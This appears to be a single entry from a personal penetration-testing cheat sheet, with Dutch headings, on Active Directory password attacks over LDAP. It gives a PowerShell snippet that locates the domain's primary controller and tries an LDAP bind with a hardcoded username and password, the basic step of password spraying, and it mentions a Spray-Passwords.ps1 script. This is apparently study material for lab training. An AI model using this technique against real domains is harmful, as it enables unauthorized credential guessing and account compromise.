# 23. AD authentication — Entry 13

## Categorie

Password attack LDAP 

## Commando

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

## Omschrijving

```
Manual script. There is also a Spray-Passwords.ps1 script
```

## Voorbeeld

_(empty)_

## Opmerkingen

_(empty)_

